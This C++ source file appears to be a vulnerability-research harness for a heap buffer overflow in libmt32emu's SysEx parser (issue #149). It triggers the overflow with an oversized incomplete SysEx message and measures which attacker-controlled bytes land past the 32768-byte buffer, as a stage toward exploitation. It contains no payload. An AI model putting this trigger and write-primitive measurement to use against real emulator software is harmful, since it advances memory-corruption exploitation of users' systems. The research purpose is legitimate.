// Bounded rung-5 alphabet probe for munt issue #149 (munt2shell).
// Uses the real pinned libmt32emu 2.8.3 static library (or pinned fixed
// 1749f7f); no parser type, allocator or interface is stubbed.
//
// Sends ONE parseStream() call carrying a 40001-byte incomplete SysEx
// (0xF0 + 40000 data bytes) and varies a single byte at a chosen offset.
// The plain build replaces operator new[] with malloc(n + 16384) so the
// chosen-byte count past the real 32768-byte allocation can be read back;
// ASan builds use the real allocator and abort at the write.
//
// This measures the WRITE ALPHABET, not an exploit: parseSysex() copies
// stream bytes verbatim only while they are < 0x80 (pinned source
// MidiStreamParser.cpp.vuln:223-256). A status byte at offset i truncates
// the buffered copy to i bytes; 0xF7 dispatches from the caller buffer
// with no copy at all.

#include <cstdio>
#include <cstdlib>
#include <cstring>

#include "mt32emu.h"

using namespace MT32Emu;

#ifdef REAL_TAIL_PROBE
static unsigned char *g_tail = NULL;
static size_t g_tail_size = 0;
static unsigned long g_alloc_32768 = 0;
static size_t g_alloc_trace[16];
static unsigned g_alloc_trace_count = 0;
void *operator new[](size_t n) {
	if (g_alloc_trace_count < 16) g_alloc_trace[g_alloc_trace_count++] = n;
	void *p = malloc(n + 16384);
	if (n == 32768) {
		++g_alloc_32768;
		g_tail = static_cast<unsigned char *>(p) + n;
		g_tail_size = 16384;
	}
	return p;
}
void operator delete[](void *p) throw() { free(p); }
void operator delete[](void *p, size_t) throw() { free(p); }
#endif

namespace {

struct CountingParser : MidiStreamParser {
	int sysexCount;
	int shortCount;
	int realtimeCount;
	int debugCount;
	Bit32u lastSysexLength;

	CountingParser() : sysexCount(0), shortCount(0), realtimeCount(0),
		debugCount(0), lastSysexLength(0) {}
protected:
	void handleShortMessage(const Bit32u) { ++shortCount; }
	void handleSysex(const Bit8u *, const Bit32u length) {
		++sysexCount;
		lastSysexLength = length;
	}
	void handleSystemRealtimeMessage(const Bit8u) { ++realtimeCount; }
	void printDebug(const char *) { ++debugCount; }
};

void reportTail() {
#ifdef REAL_TAIL_PROBE
	size_t chosen = 0;
	for (size_t i = 0; i < g_tail_size; ++i)
		if (g_tail[i] == 0x6a) ++chosen;
	printf("alloc32768=%lu tail_0x6a=%zu/%zu tail_bytes=",
		g_alloc_32768, chosen, g_tail_size);
	for (size_t i = 0; i < 16; ++i) printf("%02x", g_tail ? g_tail[i] : 0);
	printf(" alloc_trace=");
	for (unsigned i = 0; i < g_alloc_trace_count; ++i) printf("%zu,", g_alloc_trace[i]);
	printf("\n");
#else
	printf("tail_probe=disabled(ASan)\n");
#endif
}

} // namespace

int main(int argc, char **argv) {
	const char *mode = argc > 1 ? argv[1] : "all-7f";
	const Bit32u length = argc > 2 ? (Bit32u)strtoul(argv[2], NULL, 10) : 40001u;
	const long offset = argc > 3 ? strtol(argv[3], NULL, 10) : -1;
	const unsigned byteValue = argc > 4 ? (unsigned)strtoul(argv[4], NULL, 16) : 0;

	Bit8u *stream = new Bit8u[length];
	memset(stream, 0x6a, length);
	stream[0] = 0xF0;
	if (offset > 0 && (Bit32u)offset < length)
		stream[offset] = (Bit8u)byteValue;

	CountingParser parser;
	parser.parseStream(stream, length);
	printf("mode=%s len=%u offset=%ld byte=0x%02x sysex=%d lastlen=%u short=%d realtime=%d debug=%d\n",
		mode, length, offset, byteValue, parser.sysexCount, parser.lastSysexLength,
		parser.shortCount, parser.realtimeCount, parser.debugCount);
	reportTail();
	delete[] stream;
	return 0;
}
